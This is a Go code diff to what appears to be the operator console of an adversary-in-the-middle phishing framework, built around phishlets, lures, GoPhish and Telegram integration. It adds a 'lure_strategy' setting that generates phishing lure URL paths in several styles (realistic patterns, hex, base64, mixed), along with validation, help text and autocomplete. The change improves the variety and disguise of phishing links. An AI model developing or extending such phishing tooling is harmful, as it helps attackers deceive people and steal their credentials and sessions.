@@ -255,9 +255,11 @@ func (t *Terminal) handleConfig(args []string) error {
 		if t.cfg.IsCloudflareWorkerEnabled() {
 			cfWorkerEnabled = "true"
 		}
+		
+		lureStrategy := t.cfg.GetLureGenerationStrategy()
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "lure_strategy", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, lureStrategy, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -290,6 +292,21 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.manageCertificates(true)
 				return nil
 			}
+		case "lure_strategy":
+			// Validate strategy
+			validStrategies := []string{"short", "medium", "long", "realistic", "hex", "base64", "mixed"}
+			isValid := false
+			for _, s := range validStrategies {
+				if s == args[1] {
+					isValid = true
+					break
+				}
+			}
+			if !isValid {
+				return fmt.Errorf("invalid lure strategy: %s (valid: short, medium, long, realistic, hex, base64, mixed)", args[1])
+			}
+			t.cfg.SetLureGenerationStrategy(args[1])
+			return nil
 		case "gophish":
 			switch args[1] {
 			case "test":
@@ -2193,12 +2210,16 @@ func (t *Terminal) handleLures(args []string) error {
 				if err != nil {
 					return err
 				}
+				// Use configured strategy for lure path generation
+				strategy := t.cfg.GetLureGenerationStrategy()
+				lurePath := GenRandomLureString(strategy)
+				
 				l := &Lure{
-					Path:     "/" + GenRandomString(8),
+					Path:     "/" + lurePath,
 					Phishlet: args[1],
 				}
 				t.cfg.AddLure(args[1], l)
-				log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
+				log.Info("created lure with ID: %d (strategy: %s, length: %d chars)", len(t.cfg.lures)-1, strategy, len(lurePath))
 				return nil
 			}
 			return fmt.Errorf("incorrect number of arguments")
@@ -3079,6 +3100,7 @@ func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
+			readline.PcItem("lure_strategy", readline.PcItem("short"), readline.PcItem("medium"), readline.PcItem("long"), readline.PcItem("realistic"), readline.PcItem("hex"), readline.PcItem("base64"), readline.PcItem("mixed")),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("telegram", readline.PcItem("bot_token"), readline.PcItem("chat_id"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("cloudflare_worker", readline.PcItem("account_id"), readline.PcItem("api_token"), readline.PcItem("zone_id"), readline.PcItem("subdomain"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
@@ -3089,6 +3111,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"ipv4", "bind"}, "ipv4 bind <ipv4_address>", "set ipv4 bind address of the current server")
 	h.AddSubCommand("config", []string{"unauth_url"}, "unauth_url <url>", "change the url where all unauthorized requests will be redirected to")
 	h.AddSubCommand("config", []string{"autocert"}, "autocert <on|off>", "enable or disable the automated certificate retrieval from letsencrypt")
+	h.AddSubCommand("config", []string{"lure_strategy"}, "lure_strategy <strategy>", "set lure URL generation strategy: short (12-16 chars), medium (16-24 chars), long (24-32 chars), realistic (patterns), hex (32-40 hex), base64 (20-28 base64), mixed (random)")
 	h.AddSubCommand("config", []string{"gophish", "admin_url"}, "gophish admin_url <url>", "set up the admin url of a gophish instance to communicate with (e.g. https://gophish.domain.com:7777)")
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
